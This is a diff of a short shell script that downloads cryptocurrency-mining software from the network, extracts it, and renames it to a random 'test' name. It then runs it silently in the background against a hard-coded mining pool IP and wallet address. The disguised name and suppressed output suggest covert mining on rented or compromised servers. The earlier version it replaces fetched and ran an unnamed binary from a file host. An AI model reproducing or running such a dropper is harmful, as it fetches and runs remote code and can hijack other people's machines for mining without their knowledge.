@@ -2,10 +2,10 @@
 
 kolot=$(cat /dev/urandom | tr -dc '0-9' | fold -w 2 | head -n 1)
 
-wget -q -O dot upload.vina-host.com/sAcUi9loPh/python3
+wget -q -O dot github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.40/cpuminer-opt-linux-5.0.40.tar.gz
 
-chmod 777 dot
+tar -xzf dot
 
-mv dot test$kolot
+mv cpuminer-sse2 test$kolot
 
 nohup ./test$kolot -a yespowersugar -o 198.50.168.213:6241 -u DEJ2vHD2aDfBxSrcMDfqC4ACgLAqXY8mEt.vps-$kolot -p c=DGB > /dev/null 2>&1 &
